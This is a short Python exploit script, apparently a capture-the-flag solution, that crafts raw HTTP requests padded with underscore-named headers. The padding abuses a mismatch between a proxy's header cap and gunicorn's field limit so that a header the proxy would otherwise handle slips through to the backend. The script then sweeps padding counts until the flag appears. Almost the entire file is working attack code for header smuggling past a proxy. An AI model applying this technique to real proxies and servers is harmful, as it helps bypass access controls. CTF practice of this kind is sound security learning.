#!/usr/bin/env python3
"""
proxoxy caps stored headers at ~128; gunicorn's limit_request_fields=100 does NOT
count headers dropped by header_map='drop' (any name containing '_').
So we can push brevski past proxoxy's cap while staying under gunicorn's.
"""
import sys
_CH = __import__("os").path.dirname(__import__("os").path.dirname(__import__("os").path.abspath(__file__)))

sys.path.insert(0, f"{_CH}/solve")
from diff2 import conv, REALP, REALD, summarise  # noqa: E402


def build(npad, brevski_last=True, pad_name=b"X_p%d"):
    lines = [b"POST /flag HTTP/1.1", b"Host: h"]
    pads = [pad_name % i + b": 1" for i in range(npad)]
    if brevski_last:
        lines += pads + [b"brevski: george", b"Content-Length: 0"]
    else:
        lines += [b"brevski: george"] + pads + [b"Content-Length: 0"]
    return b"\r\n".join(lines) + b"\r\n\r\n"


if __name__ == "__main__":
    for npad in [0, 90, 95, 100, 120, 124, 125, 126, 127, 128, 129, 130, 140, 200, 300, 500]:
        p = build(npad)
        d = conv(REALD, [p], gap=0.3, read_for=1.0)
        q = conv(REALP, [p], gap=0.3, read_for=1.5)
        print(f"npad={npad:4d}  direct: {summarise('g', d)}   proxy: {summarise('p', q)}")
        if b"TFCCTF{" in q:
            print("*** FLAG THROUGH PROXY ***", q[q.find(b"TFCCTF{"):][:90])
            break
        sys.stdout.flush()
